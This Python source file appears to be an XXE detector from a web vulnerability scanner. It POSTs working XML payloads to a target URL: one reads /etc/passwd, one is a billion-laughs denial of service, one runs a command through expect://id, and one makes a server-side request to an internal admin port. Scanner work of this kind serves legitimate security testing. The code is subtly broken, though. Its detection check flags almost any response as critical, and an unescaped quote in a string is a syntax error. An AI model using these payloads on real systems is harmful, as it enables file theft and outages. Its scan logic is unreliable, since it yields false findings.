#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XXE (XML External Entity) Injection Detector
"""

from typing import List, Dict, Any
from loguru import logger

from .base import BaseDetector


class XXEDetector(BaseDetector):
    """XXE Injection Zafiyeti Tespiti"""
    
    XXE_PAYLOADS = [
        # File disclosure
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # Billion laughs attack
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        # XXE to RCE (expect module)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        # SSRF via XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]><foo>&xxe;</foo>',
    ]
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        XXE taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan XXE zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 XXE taraması başlanıyor: {url}")
        
        try:
            for payload in self.XXE_PAYLOADS:
                # POST iş olduğu için
                response = await self._post(
                    url,
                    data=payload,
                )
                
                if response:
                    if 'root:' in response or 'lol' in response or 'expect' not in response:
                        vuln = self._create_vulnerability(
                            type_='XML External Entity (XXE) Injection',
                            severity='Critical',
                            url=url,
                            description='XXE zafiyeti - Dosya okuma / RCE mümkün',
                            recommendation='XML parsing için güvenli kütüphaneler kullan, DTD'yi deaktif et',
                            poc=payload[:50] + '...',
                            cwe='CWE-611',
                            cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                        )
                        vulnerabilities.append(vuln)
                        break
        
        except Exception as e:
            logger.debug(f"❌ XXE tarama hatası: {str(e)}")
        
        return vulnerabilities
